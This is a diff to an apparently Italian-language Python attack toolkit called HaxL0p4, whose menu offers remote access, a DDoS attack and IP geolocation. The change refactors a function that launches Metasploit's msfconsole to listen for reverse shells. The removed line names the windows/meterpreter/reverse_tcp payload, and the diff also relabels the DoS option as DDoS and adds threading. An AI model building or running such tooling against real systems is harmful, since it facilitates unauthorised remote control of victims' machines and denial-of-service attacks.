@@ -2,6 +2,7 @@
 
 import os
 import nmap
+import threading
 #from scapy.all import * 
 import requests
 import json
@@ -65,7 +66,7 @@ opzioni_menu = f"""
  ╔══════════════════════════════════╗
  ║ [1] Remote Access                ║ 
  ║ [2] Network                      ║
- ║ [3] HaxL0p4-Dos Attack          ║
+ ║ [3] HaxL0p4-DDos Attack          ║
  ║ [4] IP Geolocation               ║
  ║                                  ║
  ║ [{Fore.CYAN}6{Style.RESET_ALL}] Update                       ║
@@ -74,6 +75,11 @@ opzioni_menu = f"""
  ║ [{Fore.RED}0{Style.RESET_ALL}] Exit                         ║
  ╚══════════════════════════════════╝
 """
+
+
+def startMsfConsole(module, LPORT, LHOST):
+    msf_command = f'msfconsole -x "use {moduli[module]}; set LHOST {LHOST}; set LPORT {LPORT}; exploit"'
+    subprocess.run(["gnome-terminal", "--", "bash", "-c", msf_command])
 
 
 def animazione_lettere(testo, ms):
@@ -312,8 +318,7 @@ def setPayload():
         
         msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
         if msf.lower() == "y":
-            command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use windows/meterpreter/reverse_tcp; set LHOST {HOST}; set LPORT {LPORT}, exploit; exploit; exec bash\"'"
-            subprocess.run(command, shell=True)
+            startMsfConsole(choice, LPORT, HOST)
             return menu()
         elif msf.lower() == "n":
             return menu()
